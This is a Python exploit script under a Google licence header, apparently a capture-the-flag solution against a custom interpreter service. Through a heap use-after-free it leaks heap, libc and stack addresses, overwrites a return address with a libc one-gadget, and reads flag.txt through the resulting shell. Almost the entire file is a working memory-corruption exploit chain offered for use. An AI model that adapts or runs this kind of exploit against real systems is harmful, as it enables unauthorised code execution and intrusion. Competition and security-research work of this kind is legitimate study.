#!/usr/bin/python
#
# Copyright 2018 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import socket
import struct
import random
import string
import time
import sys
import telnetlib

import subprocess

import ast


PORT = 12434
IP = "1.2.3.4"
VERBOSE=False;
sock = socket.socket()
sock.connect((sys.argv[1], int(sys.argv[2])));


def run_cmd(cmd, input=""):
    subp = subprocess.Popen(cmd,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE)
    stdout, stderr = subp.communicate(input)
    return stdout


def read_byte():
    buf = sock.recv(1)
    if not buf:
        raise EOFError
    return buf

def read_n(n):
    s = ''
    for _ in xrange(n):
        try:
            s += read_byte()
        except EOFError:
            if VERBOSE:
                print "<... ", `s`
            raise
    if VERBOSE:
        print '<', `s`
    return s


def read_until(sentinel='\n'):
    s = ''
    while not s.endswith(sentinel):
        #b = read_byte()
        #sys.stdout.write(b)
        #sys.stdout.flush()
        try:
            s += read_byte()
        except EOFError:
            if VERBOSE:
                print "<... ", `s`
            raise
    if VERBOSE:
        print '<', `s`
    return s

def send(s):
    if VERBOSE:
        print '>', `s`
    sock.sendall(s)

def interact():
    t = telnetlib.Telnet()
    t.sock = sock
    t.interact()

# raw_input('attach gdb');
OFFSET_1=-0x40 + 2**64
BUF = 'A' * 0x100;
send('z="' + BUF + '"\n');
send('g.' * 13 + 'g=1\n');
# First step: free while adding to create an int that contains a heap address
send('a.p=1\n');
send('a.p=a\n');
send('d=' + str(OFFSET_1) + '\n');
send('a=a+d\n');
send('a\n');
read_until(':');
heap_addr = int(read_until('\n'));
read_until('}\n');
print 'heap: ' + hex(heap_addr);

# Using this, do it again, but this time make is point at some data we control.
# We will use this data to print out a libc address (from a free chunk on the
# heap).

DATA_START = heap_addr + 0xe0;
DATA = 'C' * 0x10;
DATA += struct.pack('QQQQ', 0x70, DATA_START, 0, 0)
DATA = DATA + 'B' * (0x100 - len(DATA));

OFFSET_2 = 0x190;
send('g.' * 9 + 'g=1\n');
send('y="' + DATA + '"\n');
send('b.p.p=1\n');
send('b.p.p=b\n');
send('e=' + str(OFFSET_2) + '\n');
send('b=b+e\n');
send('y=10\n');
send('t=b+0\n');
send('t\n');
read_until(':');
libc_addr = int(read_until('\n'));
read_until('}\n');
print 'libc: ' + hex(libc_addr);

# Next, we use this libc address to find a pointer to the stack (the argv).
targ_stack_le = libc_addr - (0x7efd3919d7b8 - 0x7efd3919d000) + 0x5bd8;

DATA_2 = 'E' * 0x10;
DATA_2 += struct.pack('QQQQ', 0x70, targ_stack_le, 0, 0);

DATA_2 = DATA_2 + 'D' * (0x100 - len(DATA_2));
send('g.' * 7 + 'g=t\n');
send('y="' + DATA_2 + '"\n');
send('t=b+0\n');
send('t\n');
read_until(':');
stack_addr = int(read_until('\n'));
read_until('}\n');
stack_tar = stack_addr - 0x318;
print 'stack: ' + hex(stack_tar);
to_write = stack_tar - 0x08;

# Finally, using this stack address, we change the buffer pointer that reads in
# our input to point higher up on the stack, overwriting a good portion of it
# when we next read in input. We do this by construction some objects such
# that it's map data is the buffer, and another map entry that points to where
# we want to change the buffer to. When we do 'p.Y=q', we set the buffer to what
# the map entry for q is pointing to, which is the place to overwrite.

send('y=10\n');
DATA_3 = 'F' * 0x10;
DATA_3 += struct.pack('QQQQ', 0x70, DATA_START + 0x30, DATA_START + 0x50, 0);
DATA_3 += struct.pack('QQQQ', 0x2, stack_tar, 0, 0);
DATA_3 += struct.pack('QQQQ', 0x71, to_write, DATA_START + 0x70, 0);
DATA_3 += struct.pack('QQQQ', 0x72, DATA_START - 0x220, 0, 0);
DATA_3 += 'G' * (0x100 - len(DATA_3));
send('y="' + DATA_3 + '"\n');
# raw_input();
# We need a long input, as to reference the buffer on the stack the read length
# must be an alpha character (Y in this case).
send('b' + '.r' * 40 + '.p.Y=b.q\n');
read_until('> > > > ');
# The first 8 bytes are a return address, then the next 0x10 are junk. You
# should just pop/ignore them.
# Then fill the rest with your rop chain.
# TODO(lukeha): Fill in the rest with an actual rop chain.
MAGIC_G = libc_addr - 0x37b33c;
print 'magic: ' + hex(MAGIC_G);
PWN = struct.pack('Q', MAGIC_G);
PWN += struct.pack('QQ', 0, to_write);
PWN += '\x00' * (0x100 - len(PWN));

send(PWN + '\n');
send('cat flag.txt\n');
print read_until('\n'),;
# interact();
